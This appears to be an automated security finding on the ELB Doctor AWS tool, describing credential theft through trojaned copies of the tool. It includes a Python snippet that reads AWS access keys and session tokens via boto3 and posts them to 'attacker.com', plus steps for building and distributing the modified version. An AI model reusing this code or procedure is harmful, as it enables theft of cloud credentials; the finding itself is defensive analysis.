The following vulnerability has been identified across the provided lists.

### Vulnerability: Credential Exfiltration via Social Engineering

*   **Description:**
    1.  An attacker creates a modified version of the ELB Doctor tool.
    2.  This modified version includes malicious code designed to exfiltrate AWS credentials. This code could be added to any part of the application, for example, within the `elb_doctor/api/elb_doctor_api.py` file when making AWS API calls using `boto3`. The malicious code could capture the AWS credentials configured in the user's environment (e.g., environment variables, AWS configuration files, IAM roles assumed by CloudShell).
    3.  The attacker hosts this modified version on a public platform, or distributes it through social engineering tactics, such as emails, forum posts, or fake repositories, tricking users into downloading and using the malicious tool instead of the legitimate one.
    4.  A user, believing they are downloading the legitimate ELB Doctor tool, downloads and installs the attacker's modified version.
    5.  The user executes the modified ELB Doctor tool.
    6.  As the tool runs and interacts with AWS, the malicious code within the tool executes in the background.
    7.  This malicious code exfiltrates the user's AWS credentials to a server controlled by the attacker. This could be done through various methods, such as sending the credentials via HTTP requests, DNS queries, or other network protocols.
    8.  The attacker now has access to the user's AWS account with the permissions associated with the exfiltrated credentials.

*   **Impact:**
    -   **High Impact:** If successful, this vulnerability allows an attacker to gain unauthorized access to the victim's AWS account. The level of access depends on the permissions associated with the compromised AWS credentials. In the context of ELB Doctor, the tool requires IAM permissions to describe Elastic Load Balancers and Target Group health. If the compromised credentials have broader permissions, the attacker's impact could be significantly greater, potentially including data breaches, resource manipulation, or financial losses through unauthorized resource usage.

*   **Vulnerability Rank:** High

*   **Currently Implemented Mitigations:**
    -   The project uses `git-secrets` as a pre-commit hook to prevent accidental committing of credentials into the repository. This mitigation is described in `CONTRIBUTING.md`. However, this does not mitigate the social engineering vulnerability itself, but rather prevents developers from accidentally introducing secrets into the codebase.
    -   The `README.md` recommends using AWS CloudShell, which is a more secure environment as it manages credentials automatically and reduces the risk of exposing them directly. However, users may still choose to run the tool locally with configured credentials.
    -   The `SECURITY.md` file (mentioned in `README.md`) and `CONTRIBUTING.md#security-issue-notifications` encourage users to report security issues through AWS vulnerability reporting page instead of public GitHub issues. This is a standard security practice, but not a direct mitigation for social engineering.

*   **Missing Mitigations:**
    -   **Code Signing:** Implementing code signing for releases would allow users to verify the authenticity and integrity of the ELB Doctor tool, ensuring that they are running the official version and not a modified malicious one.
    -   **Distribution through Trusted Channels:** Publishing ELB Doctor to trusted package repositories like PyPI would significantly reduce the risk of users downloading compromised versions from unofficial sources. The `README.md` mentions plans to publish to PyPI in the future.
    -   **Security Warnings in Documentation:** Explicitly adding security warnings in the `README.md` and documentation about the risks of downloading and running software from untrusted sources, and advising users to only download the tool from the official repository or trusted package repositories, would increase user awareness.
    -   **Input Validation and Sanitization:** While not directly related to credential exfiltration, robust input validation and sanitization throughout the code can prevent other types of vulnerabilities that might be introduced in modified versions, making it harder for attackers to bundle other exploits with credential theft.

*   **Preconditions:**
    -   An attacker must be able to modify the ELB Doctor code and create a malicious version.
    -   The attacker must successfully socially engineer a user into downloading and running the malicious version instead of the legitimate one.
    -   The user must have AWS credentials configured in their environment for the ELB Doctor tool to use.

*   **Source Code Analysis:**
    -   The provided code files do not contain any explicit vulnerability related to credential exfiltration *within the original code itself*. The vulnerability arises from the *potential modification* of the code by an attacker.
    -   The tool, as designed, is intended to interact with AWS services using the AWS SDK for Python (boto3). This inherently requires AWS credentials to be configured in the environment where the tool is executed.
    -   In files like `elb_doctor/api/elb_doctor_api.py`, the `boto3` library is used to make calls to AWS APIs (e.g., `GetElbs().get_elb(config)`).  A malicious modification could be inserted at any point where AWS API calls are made. For instance, before or after making an API call, code could be added to access the AWS credentials being used by `boto3` and send them to an attacker-controlled server.
    -   Example of malicious code insertion in `elb_doctor/api/elb_doctor_api.py` (conceptual, for demonstration):

    ```python
    import boto3
    import requests # for exfiltration

    class ElbDoctorApi:
        # ... other methods ...

        def retrieve_clbs(self,answers) -> Dict:
            # ... region config ...
            config = Config(...)

            # --- Malicious code starts ---
            try:
                session = boto3.Session()
                credentials = session.get_credentials()
                if credentials:
                    access_key = credentials.access_key
                    secret_key = credentials.secret_key
                    token = credentials.token
                    exfiltration_url = "http://attacker.com/receive_creds"
                    payload = {
                        "access_key": access_key,
                        "secret_key": secret_key,
                        "token": token
                    }
                    requests.post(exfiltration_url, json=payload)
                    print("Credentials exfiltrated (simulated)") # attacker might want to be stealthier
            except Exception as e:
                print(f"Credential exfiltration failed: {e}")
            # --- Malicious code ends ---

            all_clbs = GetElbs().get_elb(config) # Original code continues
            # ... rest of the method ...
    ```
    -   This conceptual example shows how easily malicious code can be inserted to steal credentials. The attacker could make it more sophisticated to avoid detection.

*   **Security Test Case:**
    1.  **Setup Attacker Environment:**
        -   Create a simple HTTP server (e.g., using Python's `http.server` or `ngrok` for public exposure) to receive exfiltrated credentials. Note down the server's URL.
        -   Modify a copy of the `elb-doctor` code by inserting malicious code similar to the example above in `elb_doctor/api/elb_doctor_api.py` within the `retrieve_clbs` function (or any other relevant function that gets called during normal tool execution). Replace `"http://attacker.com/receive_creds"` with the URL of your attacker server.
        -   Package this modified version into a distributable format (e.g., zip file, or create a fake GitHub repository).

    2.  **Victim Setup:**
        -   Set up AWS credentials in a way that `boto3` can access them (e.g., using environment variables, AWS CLI configuration, or IAM roles if testing in an EC2 instance or CloudShell). Ensure these credentials have the necessary permissions for ELB Doctor to function (as described in IAM Permissions section of `README.md`).
        -   Download the *malicious* version of ELB Doctor from the attacker's distribution point (this simulates the social engineering part - the user is tricked into downloading the wrong version).
        -   Install the malicious ELB Doctor (e.g., using `python3 -m pip install .` if packaged as a Python package, or simply running the script if distributed as standalone files).

    3.  **Execute the Malicious Tool:**
        -   Run the `elbdoc` command (or the equivalent execution command for the modified version).
        -   Interact with the tool as a normal user would, for example, select an AWS region and ELB type. This will trigger the execution of the malicious code.

    4.  **Verify Credential Exfiltration:**
        -   Check the logs of your attacker's HTTP server. You should see a POST request containing the AWS credentials (access key, secret key, and potentially session token) sent from the victim's machine.

    5.  **Cleanup:**
        -   Remove the malicious ELB Doctor from the victim's system.
        -   Rotate or invalidate the AWS credentials that were used in the test, as they are now potentially compromised.

This test case, if successful, demonstrates that a modified version of ELB Doctor can indeed exfiltrate AWS credentials, confirming the social engineering vulnerability.
